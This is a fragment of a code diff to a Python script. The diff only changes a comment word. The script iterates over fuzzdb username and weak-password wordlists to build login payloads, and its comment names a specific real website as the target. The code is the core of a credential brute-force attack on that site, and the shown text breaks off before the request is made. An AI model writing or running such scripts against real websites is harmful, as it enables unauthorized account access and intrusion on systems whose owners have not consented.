@@ -2,7 +2,7 @@ import time
 
 import requests
 
-# weak username passwd test to http://www.smartsunchina.com
+# weak username passwd temp to http://www.smartsunchina.com
 for username in open('E://Sec//Tools//字典//fuzzdb//wordlists-user-passwd//names//namelist.txt'):
     for password in open('E://Sec//Tools//字典//fuzzdb//wordlists-user-passwd//passwds//weaksauce.txt'):
         payload = {
